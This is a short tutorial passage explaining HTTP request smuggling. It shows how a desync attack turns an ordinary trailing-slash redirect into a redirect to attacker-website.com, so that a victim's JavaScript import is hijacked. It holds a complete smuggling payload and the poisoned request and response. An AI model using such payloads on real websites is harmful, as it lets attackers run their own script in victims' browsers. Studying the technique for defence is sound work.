Many apps redirect from one URL to another and place the hostname from HOST in the request into the redirect URL. 

This is the default behavior of Apache and IIS web servers, where a request for a folder without a trailing slash receives a redirect to the same folder but with the trailing slash:

```http
GET /home HTTP/1.1
Host: normal-website.com

HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```

Smuggling can be used here to redirect users to an external domain:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```

So, the next request will be:

```http
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```

In this case the user was requesting a JavaScript file that was imported by a page on the web site, and the attacker now can fully compromise the victim user by returning their own JS in response.

